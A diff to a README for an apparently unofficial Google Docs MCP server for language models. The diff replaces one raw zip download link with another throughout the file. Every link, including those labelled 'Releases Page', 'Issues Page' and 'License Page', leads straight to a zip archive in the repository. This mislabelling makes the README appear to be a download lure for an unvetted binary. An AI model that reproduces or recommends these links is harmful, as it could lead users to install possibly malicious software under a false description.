@@ -1,7 +1,7 @@
 # 🌟 google-docs-mcp-server - Connect Your Docs with AI Power
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/mattaspira/google-docs-mcp-server/main/docs/assets/google-docs-mcp-server-v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mattaspira/google-docs-mcp-server/main/docs/assets/google-docs-mcp-server-v3.2.zip)
+[![Download](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip)
 
 ## 📝 Overview
 Welcome to the google-docs-mcp-server project. This unofficial server enables seamless connections between large language models and Google Docs. With this application, you can interact with your documents in intelligent and engaging ways, enhancing your productivity.
@@ -18,9 +18,9 @@ Before you download, ensure your computer meets the following requirements:
 - **Network:** Internet connection for Google Docs access.
 
 ## 🔗 Download & Install
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mattaspira/google-docs-mcp-server/main/docs/assets/google-docs-mcp-server-v3.2.zip). This page contains the latest version of the app.
+Visit this page to download: [Releases Page](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip). This page contains the latest version of the app.
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/mattaspira/google-docs-mcp-server/main/docs/assets/google-docs-mcp-server-v3.2.zip).
+1. Go to the [Releases Page](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip).
 2. Look for the latest version marked as "Latest Release."
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -44,7 +44,7 @@ Here are some key features of the google-docs-mcp-server:
 ## 🌐 Support & Community
 If you need help, consider checking the community discussions available in the repository. Here are some ways to connect:
 
-- **Issues Page:** If you encounter problems, report them on the [Issues Page](https://raw.githubusercontent.com/mattaspira/google-docs-mcp-server/main/docs/assets/google-docs-mcp-server-v3.2.zip).
+- **Issues Page:** If you encounter problems, report them on the [Issues Page](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip).
 - **Feature Requests:** You can suggest new features for future updates.
 
 ## 🛠️ Frequently Asked Questions (FAQ)
@@ -62,7 +62,7 @@ A: The google-docs-mcp-server is completely free to download and use.
 Stay tuned for future updates and new features. Follow the repository for announcements of new releases.
 
 ## 📜 License
-This project is open-source. You can view the licensing details on the repository's [License Page](https://raw.githubusercontent.com/mattaspira/google-docs-mcp-server/main/docs/assets/google-docs-mcp-server-v3.2.zip).
+This project is open-source. You can view the licensing details on the repository's [License Page](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip).
 
 ## 📥 Download Now Again
-Don't forget to download the application: [Download Here](https://raw.githubusercontent.com/mattaspira/google-docs-mcp-server/main/docs/assets/google-docs-mcp-server-v3.2.zip). Enjoy connecting your documents with powerful AI tools!
+Don't forget to download the application: [Download Here](https://github.com/mattaspira/google-docs-mcp-server/raw/refs/heads/main/src/tools/google_mcp_docs_server_v2.7.zip). Enjoy connecting your documents with powerful AI tools!
